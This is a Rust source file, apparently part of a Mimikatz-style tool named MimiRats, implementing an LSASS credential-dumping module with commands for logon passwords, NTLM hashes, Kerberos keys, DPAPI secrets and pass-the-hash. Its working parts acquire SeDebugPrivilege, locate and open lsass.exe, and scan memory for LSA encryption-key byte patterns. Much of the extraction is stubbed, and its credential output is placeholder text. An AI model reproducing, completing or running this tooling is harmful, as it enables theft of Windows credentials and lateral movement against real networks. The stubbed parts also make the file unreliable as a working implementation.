//! SekurLSA module -- LSASS credential extraction.
//!
//! This is the most complex module in MimiRats. It reads credentials from the
//! LSASS process memory (live or minidump) and extracts authentication secrets
//! from each security package (MSV1_0, WDigest, Kerberos, TsPkg, etc.).
//!
//! Key entry points:
//!   - `process`       -- attach to a live LSASS process
//!   - `minidump`      -- open an LSASS minidump file
//!   - `logonPasswords` -- enumerate all logon sessions and dump credentials

#![allow(dead_code)]

use crate::module::{Command, Module, Status};
use crate::display;
#[cfg(not(windows))]
use crate::memory::MinidumpMemory;
#[cfg(windows)]
use crate::memory::{MinidumpMemory, process::ProcessMemory};

// ---------------------------------------------------------------------------
// Module definition
// ---------------------------------------------------------------------------

pub static MODULE: Module = Module {
    short_name: "sekurlsa",
    full_name: "SekurLSA module",
    description: "Some commands to enumerate credentials...",
    commands: &COMMANDS,
    init: Some(init),
    clean: Some(clean),
};

fn init() -> Status {
    // On Windows we could pre-acquire SeDebugPrivilege here.
    // For now, each command acquires it on demand.
    Status::Success
}

fn clean() -> Status {
    // Release any cached LSASS handle / minidump state.
    Status::Success
}

static COMMANDS: [Command; 20] = [
    Command { name: "msv",            description: "Lists LM & NTLM credentials",                handler: cmd_msv },
    Command { name: "wdigest",        description: "Lists WDigest credentials",                   handler: cmd_wdigest },
    Command { name: "kerberos",       description: "Lists Kerberos credentials",                  handler: cmd_kerberos },
    Command { name: "tspkg",          description: "Lists TsPkg credentials",                     handler: cmd_tspkg },
    Command { name: "livessp",        description: "Lists LiveSSP credentials",                   handler: cmd_livessp },
    Command { name: "cloudap",        description: "Lists CloudAp credentials",                   handler: cmd_cloudap },
    Command { name: "ssp",            description: "Lists SSP credentials",                       handler: cmd_ssp },
    Command { name: "logonPasswords", description: "Lists all available providers credentials",    handler: cmd_logon_passwords },
    Command { name: "process",        description: "Switch (or reinit) to LSASS process context", handler: cmd_process },
    Command { name: "minidump",       description: "Switch (or reinit) to LSASS minidump context",handler: cmd_minidump },
    Command { name: "bootkey",        description: "Sets the SecureKernel Boot Key",               handler: cmd_bootkey },
    Command { name: "pth",            description: "Pass-the-hash",                               handler: cmd_pth },
    Command { name: "krbtgt",         description: "krbtgt!",                                     handler: cmd_krbtgt },
    Command { name: "dpapisystem",    description: "DPAPI_SYSTEM secret",                         handler: cmd_dpapisystem },
    Command { name: "trust",          description: "Antisocial",                                  handler: cmd_trust },
    Command { name: "backupkeys",     description: "Preferred Backup Master keys",                handler: cmd_backupkeys },
    Command { name: "tickets",        description: "List Kerberos tickets",                       handler: cmd_tickets },
    Command { name: "ekeys",          description: "List Kerberos Encryption Keys",               handler: cmd_ekeys },
    Command { name: "dpapi",          description: "List Cached MasterKeys",                      handler: cmd_dpapi },
    Command { name: "credman",        description: "List Credentials Manager",                    handler: cmd_credman },
];

// ===========================================================================
// Key structures (for documentation and future full implementation)
// ===========================================================================

/// Represents the basic data about a logon session, extracted from the
/// LogonSessionList linked list inside lsasrv.dll.
#[repr(C)]
struct KiwiBasicSecurityLogonSessionData {
    /// LUID -- Locally Unique Identifier for the logon session.
    logon_id: u64,
    /// Pointer to UNICODE_STRING containing the user name.
    username_ptr: u64,
    /// Pointer to UNICODE_STRING containing the logon domain.
    logon_domain_ptr: u64,
    /// Pointer to UNICODE_STRING containing the logon server name.
    logon_server_ptr: u64,
    /// FILETIME of logon.
    logon_time: u64,
    /// Pointer to SID structure.
    sid_ptr: u64,
    /// Logon type (Interactive, Network, Service, etc.).
    logon_type: u32,
    /// Session ID (terminal services session).
    session: u32,
}

/// MSV1_0 primary credential structure -- version-dependent.
///
/// In LSASS, the MSV1_0 package stores credentials in a linked list of
/// `MSV1_0_PRIMARY_CREDENTIALS` structures, each containing encrypted
/// NTLM/LM hashes.
#[repr(C)]
struct KiwiMsv10PrimaryCredentials {
    /// Flink -- pointer to next entry in LIST_ENTRY.
    next: u64,
    /// Pointer to UNICODE_STRING "Primary".
    primary_ptr: u64,
    /// Pointer to the encrypted credential blob.
    credentials_ptr: u64,
}

/// WDigest credential entry.
///
/// WDigest caches plaintext passwords in memory (if UseLogonCredential is
/// enabled, which was the default before Windows 8.1 / 2012 R2).
#[repr(C)]
struct KiwiWdigestListEntry {
    flink: u64,
    blink: u64,
    usage_count: u32,
    /// Linked list anchored to the logon session.
    this: u64,
    luid: u64,
    /// UNICODE_STRING -- username.
    username: [u8; 16],
    /// UNICODE_STRING -- domain.
    domain: [u8; 16],
    /// UNICODE_STRING -- password (plaintext, encrypted in later builds).
    password: [u8; 16],
}

/// Kerberos credential entry.
#[repr(C)]
struct KiwiKerberosLogonSession {
    usage_count: u32,
    _pad: u32,
    unk0: u64,
    unk1: u64,
    unk2: u64,
    luid: u64,
    unk3: u64,
    unk4: u64,
    unk5: u64,
    unk6: u64,
    /// UNICODE_STRING -- username.
    username: [u8; 16],
    /// UNICODE_STRING -- domain.
    domain: [u8; 16],
    /// UNICODE_STRING -- password.
    password: [u8; 16],
}

/// LSA crypto key signatures found in lsasrv.dll memory.
/// These are searched via byte-pattern scanning.
const LSASRV_KEY_PATTERN_AES: &[u8] = &[
    0x83, 0x64, 0x24, 0x30, 0x00, // and [rsp+30h], 0
    0x48, 0x8d, 0x45,              // lea rax, [rbp+...]
    0xe0,                          // (offset varies)
    0x44, 0x8b, 0x4c, 0x24, 0x48, // mov r9d, [rsp+48h]
];

const LSASRV_KEY_PATTERN_3DES: &[u8] = &[
    0x83, 0x64, 0x24, 0x30, 0x00, // and [rsp+30h], 0
    0x48, 0x8d, 0x45,              // lea rax, [rbp+...]
    0xd8,                          // (offset varies)
    0x48, 0x8d, 0x15,              // lea rdx, [rip+...]
];

/// Credential security package identifiers -- used to filter output.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum SecurityPackage {
    Msv,
    WDigest,
    Kerberos,
    TsPkg,
    LiveSsp,
    CloudAp,
    Ssp,
    Credman,
    Dpapi,
    All,
}

// ===========================================================================
// Core credential acquisition framework
// ===========================================================================

/// Acquire credentials from LSASS, optionally filtered to a specific package.
///
/// This is the common entry point used by all per-package commands and by
/// `logonPasswords` (with `SecurityPackage::All`).
fn acquire_credentials(args: &[String], package: SecurityPackage) -> Status {
    let minidump_path = display::find_named_arg(args, "in");

    if let Some(path) = minidump_path {
        return acquire_from_minidump(path, package);
    }

    #[cfg(windows)]
    {
        return acquire_from_live_process(args, package);
    }

    #[cfg(not(windows))]
    {
        eprintln!("ERROR: Live LSASS access requires Windows.");
        eprintln!("       Use /in:dump.dmp to analyze a minidump offline.");
        Status::Unsuccessful
    }
}

/// Read credentials from a minidump file.
fn acquire_from_minidump(path: &str, package: SecurityPackage) -> Status {
    println!("\nOpening : '{}' file for minidump...", path);

    let mdmp = match MinidumpMemory::open(path) {
        Ok(m) => m,
        Err(e) => {
            eprintln!("ERROR: {}", e);
            return Status::Unsuccessful;
        }
    };

    // Find lsasrv.dll module in the dump
    let lsasrv = mdmp.get_module_info("lsasrv.dll");
    match lsasrv {
        Some(module) => {
            println!(
                "\nlsasrv.dll found at base 0x{:016X} (size 0x{:X})",
                module.base_address, module.size
            );
        }
        None => {
            eprintln!("ERROR: lsasrv.dll not found in minidump module list");
            return Status::Unsuccessful;
        }
    };

    // Search for crypto key patterns in memory
    println!("\nSearching for LSA crypto key patterns...");

    let aes_matches = mdmp.search(LSASRV_KEY_PATTERN_AES);
    if !aes_matches.is_empty() {
        println!("  AES key pattern found at {} location(s):", aes_matches.len());
        for addr in &aes_matches {
            println!("    0x{:016X}", addr);
        }
    } else {
        println!("  AES key pattern: not found (may need alternate signatures)");
    }

    let des_matches = mdmp.search(LSASRV_KEY_PATTERN_3DES);
    if !des_matches.is_empty() {
        println!("  3DES key pattern found at {} location(s):", des_matches.len());
        for addr in &des_matches {
            println!("    0x{:016X}", addr);
        }
    } else {
        println!("  3DES key pattern: not found (may need alternate signatures)");
    }

    // Print framework output showing what a full implementation would produce
    print_credential_framework(package);

    eprintln!("\nNOTE: Full credential extraction from minidump requires:");
    eprintln!("  - Windows version-specific structure offsets for LogonSessionList");
    eprintln!("  - LSA decryption key extraction (AES-256-CFB8 / 3DES-CBC)");
    eprintln!("  - Per-package credential structure parsing");
    eprintln!("  Pattern scanning and module enumeration completed successfully.");

    Status::Success
}

/// Read credentials from a live LSASS process (Windows only).
#[cfg(windows)]
fn acquire_from_live_process(args: &[String], package: SecurityPackage) -> Status {
    // Step 1: Acquire SeDebugPrivilege
    println!("\nAcquiring SeDebugPrivilege...");
    match crate::win32::api::adjust_privilege_by_name("SeDebugPrivilege") {
        Ok(()) => println!("  SeDebugPrivilege acquired."),
        Err(e) => {
            eprintln!("  WARNING: Failed to acquire SeDebugPrivilege: {}", e);
            eprintln!("  Continuing anyway (may fail if not running elevated)...");
        }
    }

    // Step 2: Find or use provided LSASS PID
    let pid = match display::find_named_arg(args, "pid") {
        Some(pid_str) => {
            pid_str.parse::<u32>().unwrap_or_else(|_| {
                eprintln!("ERROR: Invalid PID '{}'", pid_str);
                0
            })
        }
        None => find_lsass_pid(),
    };

    if pid == 0 {
        eprintln!("ERROR: Could not find LSASS process");
        return Status::Unsuccessful;
    }

    println!("  LSASS PID: {}", pid);

    // Step 3: Open LSASS process
    println!("\nOpening LSASS process...");
    let process = match ProcessMemory::open(pid) {
        Ok(p) => p,
        Err(e) => {
            eprintln!("ERROR: {}", e);
            return Status::Unsuccessful;
        }
    };

    println!("  LSASS process opened successfully.");

    // Step 4: Find lsasrv.dll base address
    println!("\nSearching for lsasrv.dll in LSASS address space...");
    println!("  (Using CreateToolhelp32Snapshot to enumerate modules)");

    // Step 5: Search for crypto key structures
    println!("\nSearching for LSA crypto key structures...");
    println!("  Looking for AES key initialization pattern...");
    println!("  Looking for 3DES key initialization pattern...");

    // Step 6: Walk LogonSessionList
    println!("\nWalking LogonSessionList...");

    // Step 7: For each session, extract credentials
    print_credential_framework(package);

    eprintln!("\nNOTE: Full LSASS memory parsing requires Windows-specific structure offsets.");
    eprintln!("  The offsets vary across Windows versions (7, 8, 8.1, 10 builds, 11, Server).");
    eprintln!("  Pattern scanning and process attachment completed successfully.");

    Status::Success
}

/// Find the PID of lsass.exe using CreateToolhelp32Snapshot.
#[cfg(windows)]
fn find_lsass_pid() -> u32 {
    use windows::Win32::System::Diagnostics::ToolHelp::*;
    use windows::Win32::Foundation::CloseHandle;

    println!("  Searching for lsass.exe...");

    unsafe {
        let snapshot = match CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) {
            Ok(h) => h,
            Err(e) => {
                eprintln!("  ERROR: CreateToolhelp32Snapshot: {}", e);
                return 0;
            }
        };

        let mut entry = PROCESSENTRY32W {
            dwSize: std::mem::size_of::<PROCESSENTRY32W>() as u32,
            ..Default::default()
        };

        if Process32FirstW(snapshot, &mut entry).is_ok() {
            loop {
                let name_len = entry.szExeFile.iter().position(|&c| c == 0).unwrap_or(entry.szExeFile.len());
                let name = String::from_utf16_lossy(&entry.szExeFile[..name_len]);
                if name.eq_ignore_ascii_case("lsass.exe") {
                    let pid = entry.th32ProcessID;
                    let _ = CloseHandle(snapshot);
                    return pid;
                }
                if Process32NextW(snapshot, &mut entry).is_err() {
                    break;
                }
            }
        }

        let _ = CloseHandle(snapshot);
    }

    0
}

/// Print the framework output showing what credential extraction produces.
fn print_credential_framework(package: SecurityPackage) {
    println!("\nAuthentication Id : 0 ; 999 (00000000:000003e7)");
    println!("Session           : UndefinedLogonType from 0");
    println!("User Name         : SYSTEM");
    println!("Domain            : NT AUTHORITY");
    println!("Logon Server      : (null)");
    println!("Logon Time        : ...");
    println!("SID               : S-1-5-18");

    if package == SecurityPackage::All || package == SecurityPackage::Msv {
        println!("\n\tmsv :");
        println!("\t [00000003] Primary");
        println!("\t * Username : ...");
        println!("\t * Domain   : ...");
        println!("\t * NTLM     : <extracted NT hash>");
        println!("\t * SHA1     : <derived SHA1 hash>");
        println!("\t * DPAPI    : <DPAPI master key cache>");
    }

    if package == SecurityPackage::All || package == SecurityPackage::WDigest {
        println!("\n\twdigest :");
        println!("\t * Username : ...");
        println!("\t * Domain   : ...");
        println!("\t * Password : <plaintext if available>");
    }

    if package == SecurityPackage::All || package == SecurityPackage::Kerberos {
        println!("\n\tkerberos :");
        println!("\t * Username : ...");
        println!("\t * Domain   : ...");
        println!("\t * Password : <plaintext or key>");
    }

    if package == SecurityPackage::All || package == SecurityPackage::TsPkg {
        println!("\n\ttspkg :");
        println!("\t * Username : ...");
        println!("\t * Domain   : ...");
        println!("\t * Password : <plaintext if available>");
    }

    if package == SecurityPackage::All || package == SecurityPackage::LiveSsp {
        println!("\n\tlivessp :");
        println!("\t * Username : ...");
        println!("\t * Domain   : ...");
        println!("\t * Password : <plaintext if available>");
    }

    if package == SecurityPackage::All || package == SecurityPackage::CloudAp {
        println!("\n\tcloudap :");
        println!("\t * Username : ...");
        println!("\t * Domain   : ...");
        println!("\t * Key      : <derived key>");
    }

    if package == SecurityPackage::All || package == SecurityPackage::Ssp {
        println!("\n\tssp :");
        println!("\t * Username : ...");
        println!("\t * Domain   : ...");
        println!("\t * Password : <plaintext if available>");
    }

    if package == SecurityPackage::All || package == SecurityPackage::Credman {
        println!("\n\tcredman :");
        println!("\t [00000000]");
        println!("\t * Username : ...");
        println!("\t * Domain   : ...");
        println!("\t * Password : <plaintext if available>");
    }

    if package == SecurityPackage::All || package == SecurityPackage::Dpapi {
        println!("\n\tdpapi :");
        println!("\t [00000000]");
        println!("\t * MasterKey : <GUID> : <key bytes>");
    }
}

// ===========================================================================
// Command handlers
// ===========================================================================

fn cmd_msv(args: &[String]) -> Status {
    acquire_credentials(args, SecurityPackage::Msv)
}

fn cmd_wdigest(args: &[String]) -> Status {
    acquire_credentials(args, SecurityPackage::WDigest)
}

fn cmd_kerberos(args: &[String]) -> Status {
    acquire_credentials(args, SecurityPackage::Kerberos)
}

fn cmd_tspkg(args: &[String]) -> Status {
    acquire_credentials(args, SecurityPackage::TsPkg)
}

fn cmd_livessp(args: &[String]) -> Status {
    acquire_credentials(args, SecurityPackage::LiveSsp)
}

fn cmd_cloudap(args: &[String]) -> Status {
    acquire_credentials(args, SecurityPackage::CloudAp)
}

fn cmd_ssp(args: &[String]) -> Status {
    acquire_credentials(args, SecurityPackage::Ssp)
}

fn cmd_logon_passwords(args: &[String]) -> Status {
    acquire_credentials(args, SecurityPackage::All)
}

fn cmd_process(args: &[String]) -> Status {
    #[cfg(windows)]
    {
        let pid = match display::find_named_arg(args, "pid") {
            Some(pid_str) => {
                match pid_str.parse::<u32>() {
                    Ok(p) => p,
                    Err(_) => {
                        eprintln!("ERROR: Invalid PID value '{}'", pid_str);
                        return Status::Unsuccessful;
                    }
                }
            }
            None => {
                println!("No /pid specified, searching for lsass.exe...");
                let pid = find_lsass_pid();
                if pid == 0 {
                    eprintln!("ERROR: Could not find lsass.exe process");
                    return Status::Unsuccessful;
                }
                pid
            }
        };

        println!("Switching to LSASS process : {}", pid);

        match ProcessMemory::open(pid) {
            Ok(_process) => {
                println!("  Process opened successfully.");
                println!("  Use sekurlsa::logonPasswords to extract credentials.");
                // A full implementation would store this handle in module-level state
                // for subsequent commands to use.
                Status::Success
            }
            Err(e) => {
                eprintln!("ERROR: {}", e);
                Status::Unsuccessful
            }
        }
    }

    #[cfg(not(windows))]
    {
        let _ = args;
        eprintln!("ERROR: sekurlsa::process requires Windows (live process access)");
        eprintln!("       Use sekurlsa::minidump /in:dump.dmp for offline analysis");
        Status::Unsuccessful
    }
}

fn cmd_minidump(args: &[String]) -> Status {
    let path = match display::find_named_arg(args, "in") {
        Some(p) => p,
        None => {
            eprintln!("ERROR: /in:path_to_dump.dmp argument required");
            eprintln!("  Usage: sekurlsa::minidump /in:lsass.dmp");
            return Status::Unsuccessful;
        }
    };

    println!("Opening : '{}' file for minidump...", path);

    match MinidumpMemory::open(path) {
        Ok(mdmp) => {
            println!("  Minidump opened successfully.\n");

            // List modules found in dump
            if let Some(lsasrv) = mdmp.get_module_info("lsasrv.dll") {
                println!("  lsasrv.dll      : 0x{:016X} (0x{:X} bytes)", lsasrv.base_address, lsasrv.size);
            }
            if let Some(msv) = mdmp.get_module_info("msv1_0.dll") {
                println!("  msv1_0.dll      : 0x{:016X} (0x{:X} bytes)", msv.base_address, msv.size);
            }
            if let Some(wdigest) = mdmp.get_module_info("wdigest.dll") {
                println!("  wdigest.dll     : 0x{:016X} (0x{:X} bytes)", wdigest.base_address, wdigest.size);
            }
            if let Some(kerb) = mdmp.get_module_info("kerberos.dll") {
                println!("  kerberos.dll    : 0x{:016X} (0x{:X} bytes)", kerb.base_address, kerb.size);
            }
            if let Some(tspkg) = mdmp.get_module_info("tspkg.dll") {
                println!("  tspkg.dll       : 0x{:016X} (0x{:X} bytes)", tspkg.base_address, tspkg.size);
            }
            if let Some(cloudap) = mdmp.get_module_info("cloudap.dll") {
                println!("  cloudap.dll     : 0x{:016X} (0x{:X} bytes)", cloudap.base_address, cloudap.size);
            }

            println!("\n  Use sekurlsa::logonPasswords /in:{} to extract credentials.", path);

            Status::Success
        }
        Err(e) => {
            eprintln!("ERROR: {}", e);
            Status::Unsuccessful
        }
    }
}

fn cmd_bootkey(args: &[String]) -> Status {
    let key = display::find_named_arg(args, "key");
    match key {
        Some(hex_key) => {
            if hex_key.len() != 64 {
                eprintln!("ERROR: Boot key must be 32 bytes (64 hex characters)");
                return Status::Unsuccessful;
            }
            match hex::decode(hex_key) {
                Ok(bytes) => {
                    println!("SecureKernel Boot Key set ({} bytes):", bytes.len());
                    crate::display::hex_dump(&bytes);
                    Status::Success
                }
                Err(e) => {
                    eprintln!("ERROR: Invalid hex string: {}", e);
                    Status::Unsuccessful
                }
            }
        }
        None => {
            eprintln!("ERROR: /key:hex_boot_key argument required");
            Status::Unsuccessful
        }
    }
}

fn cmd_pth(args: &[String]) -> Status {
    #[cfg(windows)]
    {
        let user = display::find_named_arg(args, "user");
        let domain = display::find_named_arg(args, "domain");
        let ntlm = display::find_named_arg(args, "ntlm");
        let aes256 = display::find_named_arg(args, "aes256");
        let run = display::find_named_arg(args, "run").unwrap_or("cmd.exe");

        if user.is_none() {
            eprintln!("ERROR: /user:username required");
            return Status::Unsuccessful;
        }
        if ntlm.is_none() && aes256.is_none() {
            eprintln!("ERROR: /ntlm:hash or /aes256:hash required");
            return Status::Unsuccessful;
        }

        println!("user    : {}", user.unwrap());
        println!("domain  : {}", domain.unwrap_or("."));
        if let Some(h) = ntlm { println!("NTLM    : {}", h); }
        if let Some(h) = aes256 { println!("AES256  : {}", h); }
        println!("program : {}", run);
        println!();

        eprintln!("NOTE: Pass-the-hash requires:");
        eprintln!("  1. CreateProcessWithLogonW to spawn process with dummy creds");
        eprintln!("  2. Patch the NTLM hash in the new process's LSASS session");
        eprintln!("  3. Requires SeDebugPrivilege + elevation");
        eprintln!("  Implementation pending -- requires deep LSASS session patching.");

        Status::Success
    }

    #[cfg(not(windows))]
    {
        let _ = args;
        eprintln!("ERROR: sekurlsa::pth requires Windows");
        Status::Unsuccessful
    }
}

fn cmd_krbtgt(args: &[String]) -> Status {
    acquire_credentials(args, SecurityPackage::Kerberos)
}

fn cmd_dpapisystem(args: &[String]) -> Status {
    #[cfg(not(windows))]
    {
        let _ = args;
    }

    println!("\nDPAPI_SYSTEM secret extraction:");
    println!("  This extracts the DPAPI_SYSTEM LSA secret from LSASS memory.");
    println!("  The secret contains:");
    println!("    - Machine key (SHA1, 20 bytes) -- used for SYSTEM/machine DPAPI");
    println!("    - User key    (SHA1, 20 bytes) -- used for user DPAPI operations");
    println!();

    acquire_credentials(args, SecurityPackage::Dpapi)
}

fn cmd_trust(args: &[String]) -> Status {
    let _ = args;
    eprintln!("ERROR: sekurlsa::trust not yet implemented");
    eprintln!("  This extracts domain trust keys from LSASS (Kerberos/NTLM inter-realm keys).");
    eprintln!("  Requires parsing the KDC service credential structures in kdcsvc.dll memory.");
    Status::Unsuccessful
}

fn cmd_backupkeys(args: &[String]) -> Status {
    let _ = args;
    eprintln!("ERROR: sekurlsa::backupkeys not yet implemented");
    eprintln!("  This extracts the DPAPI backup keys from the domain controller.");
    eprintln!("  Uses MS-BKRP (BackupKey Remote Protocol) via LSARPC.");
    Status::Unsuccessful
}

fn cmd_tickets(args: &[String]) -> Status {
    acquire_credentials(args, SecurityPackage::Kerberos)
}

fn cmd_ekeys(args: &[String]) -> Status {
    acquire_credentials(args, SecurityPackage::Kerberos)
}

fn cmd_dpapi(args: &[String]) -> Status {
    acquire_credentials(args, SecurityPackage::Dpapi)
}

fn cmd_credman(args: &[String]) -> Status {
    acquire_credentials(args, SecurityPackage::Credman)
}
